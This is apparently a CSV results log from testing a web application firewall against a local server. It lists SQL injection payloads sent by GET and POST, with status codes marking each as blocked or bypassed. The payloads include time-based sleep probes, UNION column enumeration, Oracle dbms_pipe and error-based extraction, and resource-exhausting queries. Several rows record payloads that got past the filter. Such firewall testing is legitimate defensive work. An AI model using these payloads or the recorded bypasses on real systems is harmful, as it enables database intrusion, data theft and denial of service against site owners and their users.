probe_index,source_row,method,payload,url,status,blocked,outcome,request_sent,url_length,latency_ms,attempts,error
9451,5057,POST,"1   )    )    and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.944,1,
9452,694,GET,1%'   )    )     )   rlike sleep  (  5  )  #,http://127.0.0.1:18080/?payload=1%25%27+++%29++++%29+++++%29+++rlike+sleep++%28++5++%29++%23,403,True,blocked,True,92,5.658,1,
9453,694,POST,1%'   )    )     )   rlike sleep  (  5  )  #,http://127.0.0.1:18080/,403,True,blocked,True,23,5.142,1,
9454,1763,GET,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,http://127.0.0.1:18080/?payload=1%27+++%29++++%29++++as+hzbj+where+1725++%3D++1725+or+sleep++%28++5++%29++%23,403,True,blocked,True,109,5.639,1,
9455,1763,POST,1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,http://127.0.0.1:18080/,403,True,blocked,True,23,6.913,1,
9456,4696,GET,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",http://127.0.0.1:18080/?payload=1%27+++%29++++%29+++++%29+++or+char++%28++117++%29++%7C%7Cchar++%28++111++%29++%7C%7Cchar++%28++105++%29++%7C%7Cchar++%28++100++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++%27zglq%27++%3D++%27zglq,403,True,blocked,True,417,5.947,1,
9457,4696,POST,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'zglq'  =  'zglq",http://127.0.0.1:18080/,403,True,blocked,True,23,7.322,1,
9458,6153,GET,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",http://127.0.0.1:18080/?payload=1+++%29++++%29++++union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,403,True,blocked,True,129,6.674,1,
9459,6153,POST,"1   )    )    union all select null,null,null,null,null,null,null,null,null--",http://127.0.0.1:18080/,403,True,blocked,True,23,4.668,1,
9460,1705,GET,"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://127.0.0.1:18080/?payload=1%27+++%29++++%29++++as+gqzy+where+2312++%3D++2312+or+5286++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--,403,True,blocked,True,220,4.505,1,
9461,1705,POST,"1'   )    )    as gqzy where 2312  =  2312 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.217,1,
9462,3930,GET,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",http://127.0.0.1:18080/?payload=1%22+++%29++++%29++++and+elt++%28++1210++%3D++1210%2Csleep++%28++5+++%29++++%29++++and++++%28++++%28+++%22utlk%22+like+%22utlk,403,True,blocked,True,158,5.051,1,
9463,3930,POST,"1""   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   ""utlk"" like ""utlk",http://127.0.0.1:18080/,403,True,blocked,True,23,5.726,1,
9464,3567,GET,"select count  (  *  )   from generate_series  (  1,5000000  )  #",http://127.0.0.1:18080/?payload=select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000++%29++%23,403,True,blocked,True,110,5.287,1,
9465,3567,POST,"select count  (  *  )   from generate_series  (  1,5000000  )  #",http://127.0.0.1:18080/,403,True,blocked,True,23,5.946,1,
9466,6108,GET,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",http://127.0.0.1:18080/?payload=1%27+in+boolean+mode++%29+++or+8315++%3D++++%28++select+count++%28++%2A++%29+++from+sysibm.systables+as+t1%2Csysibm.systables+as+t2%2Csysibm.systables+as+t3++%29++%23,403,True,blocked,True,198,4.959,1,
9467,6108,POST,"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",http://127.0.0.1:18080/,403,True,blocked,True,23,6.841,1,
9468,354,GET,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",http://127.0.0.1:18080/?payload=-9808%27+in+boolean+mode++%29+++union+all+select+2528%2C2528%2C2528%2C2528%2C2528%2C2528%2C2528--,403,True,blocked,True,129,7.018,1,
9469,354,POST,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",http://127.0.0.1:18080/,403,True,blocked,True,23,5.734,1,
9470,2839,GET,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",http://127.0.0.1:18080/?payload=++%28++select+++%28++case+when+++%28++1938++%3D++1938++%29+++then+dbms_pipe.receive_message++%28++chr++%28++118++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++76++%29++%2C5++%29+++else+1938+end++%29+++from+dual++%29++,403,True,blocked,True,276,5.814,1,
9471,2839,POST,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",http://127.0.0.1:18080/,403,True,blocked,True,23,6.224,1,
9472,3598,GET,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",http://127.0.0.1:18080/?payload=select+dbms_pipe.receive_message++%28++chr++%28++66++%29++%7C%7Cchr++%28++67++%29++%7C%7Cchr++%28++79++%29++%7C%7Cchr++%28++101++%29++%2C5++%29+++from+dual+and++++%28++++%28+++++%28++%27aatp%27++%3D++%27aatp,403,True,blocked,True,239,5.98,1,
9473,3598,POST,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  'aatp'  =  'aatp",http://127.0.0.1:18080/,403,True,blocked,True,23,5.396,1,
9474,480,GET,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",http://127.0.0.1:18080/?payload=1++%29+++and+8514++%3D++++%28++select+count++%28++%2A++%29+++from+domain.domains+as+t1%2Cdomain.columns+as+t2%2Cdomain.tables+as+t3++%29+++and+++%28++4666++%3D++4666,403,True,blocked,True,197,4.662,1,
9475,480,POST,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",http://127.0.0.1:18080/,403,True,blocked,True,23,7.223,1,
9476,5893,GET,"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,http://127.0.0.1:18080/?payload=1%25%22+++%29++++%29+++++%29+++and+char++%28++120++%29++%7C%7Cchar++%28++106++%29++%7C%7Cchar++%28++117++%29++%7C%7Cchar++%28++85++%29++++%3D++regexp_substring++%28++repeat++%28++right++%28++char++%28++9981++%29++%2C0++%29++%2C5000000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++%22%25%22++%3D++%22,403,True,blocked,True,337,6.941,1,
9477,5893,POST,"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,http://127.0.0.1:18080/,403,True,blocked,True,23,6.641,1,
9478,4710,GET,"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",http://127.0.0.1:18080/?payload=1+++%29++++%29++++and+char++%28++107++%29++%7C%7Cchar++%28++121++%29++%7C%7Cchar++%28++97++%29++%7C%7Cchar++%28++80++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29++--,403,True,blocked,True,356,6.324,1,
9479,4710,POST,"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",http://127.0.0.1:18080/,403,True,blocked,True,23,6.918,1,
9480,3056,GET,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",http://127.0.0.1:18080/?payload=call+regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++%27gtcb%27++%3D++%27gtcb,200,False,bypass,True,282,8.821,1,
9481,3056,POST,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",http://127.0.0.1:18080/,200,False,bypass,True,23,9.352,1,
9482,2579,GET,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",http://127.0.0.1:18080/?payload=select+dbms_pipe.receive_message++%28++chr++%28++66++%29++%7C%7Cchr++%28++67++%29++%7C%7Cchr++%28++79++%29++%7C%7Cchr++%28++101++%29++%2C5++%29+++from+dual+and++++%28++++%28+++%22vfvh%22++%3D++%22vfvh,403,True,blocked,True,232,7.803,1,
9483,2579,POST,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",http://127.0.0.1:18080/,403,True,blocked,True,23,7.061,1,
9484,2590,GET,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",http://127.0.0.1:18080/?payload=1+++%29++++%29+++++%29+++and+char++%28++111++%29++%7C%7Cchar++%28++77++%29++%7C%7Cchar++%28++121++%29++%7C%7Cchar++%28++88++%29++++%3D++regexp_substring++%28++repeat++%28++left++%28++crypt_key++%28++char++%28++65++%29++%7C%7Cchar++%28++69++%29++%7C%7Cchar++%28++83++%29++%2Cnull++%29++%2C0++%29++%2C500000000++%29++%2Cnull++%29+++and++++%28++++%28+++++%28++2997++%3D++2997,403,True,blocked,True,404,6.049,1,
9485,2590,POST,"1   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  2997  =  2997",http://127.0.0.1:18080/,403,True,blocked,True,23,6.761,1,
9486,4713,GET,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",http://127.0.0.1:18080/?payload=-5748%27+union+all+select+1224%2C1224%2C1224%2C1224%2C1224%2C1224%2C1224%2C1224%2C1224%23,403,True,blocked,True,121,6.387,1,
9487,4713,POST,"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",http://127.0.0.1:18080/,403,True,blocked,True,23,7.196,1,
9488,4423,GET,"1""  )   or 6692  =  ",http://127.0.0.1:18080/?payload=1%22++%29+++or+6692++%3D++,403,True,blocked,True,58,6.651,1,
9489,4423,POST,"1""  )   or 6692  =  ",http://127.0.0.1:18080/,403,True,blocked,True,23,6.319,1,
9490,5189,GET,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,http://127.0.0.1:18080/?payload=1++%29+++and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++gcrr++%29++%23,403,True,blocked,True,138,5.575,1,
9491,5189,POST,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,http://127.0.0.1:18080/,403,True,blocked,True,23,6.856,1,
9492,6297,GET,1' rlike sleep  (  5  ) ,http://127.0.0.1:18080/?payload=1%27+rlike+sleep++%28++5++%29+,403,True,blocked,True,62,6.581,1,
9493,6297,POST,1' rlike sleep  (  5  ) ,http://127.0.0.1:18080/,403,True,blocked,True,23,7.413,1,
9494,1094,GET,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",http://127.0.0.1:18080/?payload=1%22+where+1831++%3D++1831+and+++%28++select+%2A+from+++%28++select++%28++sleep++%28++5+++%29++++%29+++++%29++gcrr++%29++%23,403,True,blocked,True,156,7.461,1,
9495,1094,POST,"1"" where 1831  =  1831 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",http://127.0.0.1:18080/,403,True,blocked,True,23,6.825,1,
9496,5588,GET,"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://127.0.0.1:18080/?payload=1%22+and+9660++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--,403,True,blocked,True,175,6.804,1,
9497,5588,POST,"1"" and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://127.0.0.1:18080/,403,True,blocked,True,23,7.834,1,
9498,6102,GET,"1'   )    )     )   union all select null,null,null,null,null,null,null#",http://127.0.0.1:18080/?payload=1%27+++%29++++%29+++++%29+++union+all+select+null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,403,True,blocked,True,126,6.832,1,
9499,6102,POST,"1'   )    )     )   union all select null,null,null,null,null,null,null#",http://127.0.0.1:18080/,403,True,blocked,True,23,5.908,1,
9500,1036,GET,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",http://127.0.0.1:18080/?payload=1%27+++%29++++%29+++++%29+++and+8407++%3D++++%28++select+count++%28++%2A++%29+++from+generate_series++%28++1%2C5000000+++%29++++%29++++and++++%28++++%28+++++%28++%27eflk%27++%3D++%27eflk,403,True,blocked,True,218,5.4,1,
9501,1036,POST,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",http://127.0.0.1:18080/,403,True,blocked,True,23,7.469,1,
9502,5326,GET,-6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,http://127.0.0.1:18080/?payload=-6190%27++%29+++where+2621++%3D++2621+or+4144++%3D++++%28++select+upper++%28++xmltype++%28++chr++%28++60++%29++%7C%7Cchr++%28++58++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++4144++%3D++4144++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++62+++%29++++%29+++++%29+++from+dual++%29++--,403,True,blocked,True,596,7.227,1,
9503,5326,POST,-6190'  )   where 2621  =  2621 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,http://127.0.0.1:18080/,403,True,blocked,True,23,5.731,1,
9504,1400,GET,"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",http://127.0.0.1:18080/?payload=1%27%2B++%28++select+%27pvej%27+where+4496++%3D++4496+and+6055++%3D++ctxsys.drithsx.sn++%28++6055%2C++%28++chr++%28++113++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++112++%29++%7C%7Cchr++%28++106++%29++%7C%7Cchr++%28++113++%29++%7C%7C++%28++select+++%28++case+when+++%28++6055++%3D++6055++%29+++then+1+else+0+end++%29+++from+dual++%29++%7C%7Cchr++%28++113++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++118++%29++%7C%7Cchr++%28++122++%29++%7C%7Cchr++%28++113+++%29++++%29++++++%29++++%29+++%2B%27,403,True,blocked,True,532,5.498,1,
9505,1400,POST,"1'+  (  select 'pvej' where 4496  =  4496 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",http://127.0.0.1:18080/,403,True,blocked,True,23,7.367,1,
9506,144,GET,1' where 6116  =  6116,http://127.0.0.1:18080/?payload=1%27+where+6116++%3D++6116,200,False,bypass,True,58,6.365,1,
9507,144,POST,1' where 6116  =  6116,http://127.0.0.1:18080/,200,False,bypass,True,23,7.699,1,
9508,3921,GET," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",http://127.0.0.1:18080/?payload=+select+%2A+from+users+where+id++%3D++1+or+%22++%28++%23%22+or+1++%3D++1+--+1,403,True,blocked,True,109,6.456,1,
9509,3921,POST," select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",http://127.0.0.1:18080/,403,True,blocked,True,23,5.605,1,
9510,5,GET,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",http://127.0.0.1:18080/?payload=-9808%27+in+boolean+mode++%29+++union+all+select+2528%2C2528%2C2528%2C2528%2C2528%2C2528%2C2528--,403,True,blocked,True,129,6.258,1,
9511,5,POST,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",http://127.0.0.1:18080/,403,True,blocked,True,23,4.994,1,
9512,2716,GET,1 exec sp_   (  or exec xp_  ) ,http://127.0.0.1:18080/?payload=1+exec+sp_+++%28++or+exec+xp_++%29+,200,False,bypass,True,67,6.243,1,
9513,2716,POST,1 exec sp_   (  or exec xp_  ) ,http://127.0.0.1:18080/,200,False,bypass,True,23,6.168,1,
9514,2421,GET,end and '%'  =  ',http://127.0.0.1:18080/?payload=end+and+%27%25%27++%3D++%27,403,True,blocked,True,59,5.414,1,
9515,2421,POST,end and '%'  =  ',http://127.0.0.1:18080/,403,True,blocked,True,23,5.492,1,
9516,88,GET,"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://127.0.0.1:18080/?payload=1%27%7C%7C++%28++select+%27dbxr%27+where+4014++%3D++4014+and+9660++%3D++++%28++select+count++%28++%2A++%29+++from+all_users+t1%2Call_users+t2%2Call_users+t3%2Call_users+t4%2Call_users+t5++%29++--,403,True,blocked,True,227,5.72,1,
9517,88,POST,"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",http://127.0.0.1:18080/,403,True,blocked,True,23,5.468,1,
